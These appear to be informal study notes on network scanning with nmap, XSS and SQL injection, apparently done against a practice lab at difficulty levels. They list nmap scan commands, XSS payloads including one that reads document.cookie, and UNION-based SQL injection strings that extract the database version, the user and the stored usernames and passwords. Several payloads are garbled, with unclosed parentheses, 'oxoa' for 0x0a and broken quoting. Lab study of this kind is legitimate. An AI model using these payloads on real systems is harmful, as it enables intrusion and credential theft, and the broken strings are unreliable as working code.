Network & Port Scanning via Wireshark….

Port Scanning: Scan for to check or identify the port is open or not on the network.

Network Scanning: It discovering IP address of operating system.

Wireshark: It will help to you capture the network packets & display them.


1)TCP Scan

Establish TCP connection via 3-way handshake protocol
i.e.

1)SYN
2)SYN, ACK
3)ACK

nmap -sT -p 445  192.168.1.102(Any IP)


2)Stealth Scan

It scan the port without establish the full or complete TCP connection.

nmap -sS  -p  22  192.168.1.102



3)UDP Scan

It works by sending UDP packets & wait for responses.


nmap -sU  -p  161  192.168.1.119



4)NULL Scan

When source send NULL packet to destination, it will not know how to reply the request. It will discard the packet & no reply will be sent.

nmap -sN  -p 22  192.168.1.102





XSS Attack….

Attacker injects malicious scripts into web pages.

1)Non-Persistent

In this type of attack injected malicious script is reflected off the web server as a response.

a)Reflected XSS

i.	Low: 

		<script>alert()</script>
ii.	Medium:
		
		<script>alert()</script>
		<sCRipt>alert()</script>
iii.	High:
 
		<img src=x onerror=alert()>





2)Persistent

In this type injected malicious is stored on vulnerable web server. Injected script is then permanently stored on web pages.

a)	Stored XSS

i.	Low:

		<script>alert()</script>

ii.	Medium:

		<Script>alert(“Hacked”)</Script>

iii.	High:

		<svg/onload = alert(“Hacked”>



3)DOM XSS(Document Object Model)

Low:

		<script>alert(1)</script>
Medium:

		<<select><img src=’#’ onclick=alert’Gotcha!>
High:
	
		<script>alert(document.cookie)</script>



SQL Injection


Attacker inject or insert the SQL code or query to exploit any SQL database driven web application.

Some queries :

		‘1’ = ‘1’

		%’ or ‘1’ = ‘1’
		
		a’ OR “=’




To check database version
		
%’ or 0 = 0 union select all null, version() #
						

To display Database user

%’ or 0 = 0 union select all null, user() #

To display all necessary authentication information present database

 %’  and 1=0 union select null, concat(first_name,0x0a,last_name,0xoa,user,oxoa,password) from users #
